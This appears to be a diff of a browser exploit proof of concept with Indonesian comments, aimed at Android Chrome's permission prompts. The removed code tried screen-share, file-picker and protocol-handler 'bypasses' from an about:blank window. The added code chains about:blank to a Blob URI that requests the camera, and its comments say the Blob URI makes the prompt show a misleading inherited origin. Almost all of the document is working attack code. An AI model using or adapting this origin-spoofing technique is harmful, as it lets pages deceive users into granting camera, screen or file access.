@@ -1,58 +1,45 @@
 <!doctype html>
 <html>
 <head>
-<style>html { font-family: sans-serif; background: transparent; }</style>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>html { font-family: sans-serif; background: transparent; }</style>
 </head>
 <body>
 <script>
-var searchParams = new URLSearchParams(window.location.search);
-var mode = searchParams.get('mode');
-
-const clickAgainInstructions = '<meta name="viewport" content="width=device-width, initial-scale=1"><style>html { font-family: sans-serif; text-align:center; padding-top: 20vh; }</style><h2>Tap screen to trigger Native API</h2>';
-
 window.addEventListener('click', () => {
-    // Trik "about:blank" inheritance dari Alesandro tetep dipakai!
+    // LEVEL 1: Buka about:blank (Mewarisi origin googlelogoligature)
     var newWin = window.open('about:blank');
     
+    // LEVEL 2: Bikin Blob URI yang berisi eksekusi Kamera
+    // Blob URI juga mewarisi origin, tapi format string-nya (blob:https://...) 
+    // bikin Origin Formatter Android Chrome sering nge-glitch!
+    const blobContent = `
+        <!doctype html>
+        <html>
+        <head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+        <body style="text-align:center; padding-top:50px; font-family:sans-serif;">
+            <h2>Processing Secure Request...</h2>
+            <script>
+                // Eksekusi API Kamera dari dalam rantai Blob!
+                setTimeout(() => {
+                    navigator.mediaDevices.getUserMedia({video: true})
+                    .then(s => alert('SUCCESS: Camera Granted!'))
+                    .catch(e => alert('ERROR: ' + e));
+                }, 300);
+            <\/script>
+        </body>
+        </html>
+    `;
+    
+    // Konversi ke Blob
+    const blob = new Blob([blobContent], {type: 'text/html'});
+    const blobUrl = URL.createObjectURL(blob);
+    
+    // LEVEL 3: Navigasi window about:blank tadi ke Blob URI
+    // Ini yang bikin UI Android Chrome pusing saat ngerender Permission Prompt!
     setTimeout(() => {
-        switch (mode) {
-            case 'screenshare':
-                // BYPASS 1: MediaProjection System Dialog (Screen Recording)
-                // Berbeda dengan getUserMedia (Kamera), ini memanggil UI OS Android!
-                newWin.addEventListener('click', async () => {
-                    try {
-                        await newWin.navigator.mediaDevices.getDisplayMedia({video: true});
-                    } catch (e) { console.log(e); }
-                });
-                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: System Screen Share UI</p>";
-                break;
-
-            case 'filesystem':
-                // BYPASS 2: Native Android File Picker
-                // Origin (googlelogoligature) akan dikirim ke OS File Manager
-                newWin.addEventListener('click', async () => {
-                    try {
-                        await newWin.showOpenFilePicker({
-                            types: [{ description: 'Images', accept: {'image/*': ['.png', '.gif', '.jpeg', '.jpg']} }]
-                        });
-                    } catch (e) { console.log(e); }
-                });
-                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: System File Picker UI</p>";
-                break;
-
-            case 'protocol':
-                // BYPASS 3: Register Protocol Handler
-                // Memanggil popup instalasi handler yang punya class UI berbeda
-                newWin.addEventListener('click', () => {
-                    try {
-                        newWin.navigator.registerProtocolHandler("web+secure", "https://googlelogoligature.com/?q=%s", "Secure Handler");
-                    } catch (e) { console.log(e); }
-                });
-                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: Protocol Handler UI</p>";
-                break;
-        }
-    }, 150);
+        newWin.location.href = blobUrl;
+    }, 100);
 });
 </script>
 </body>
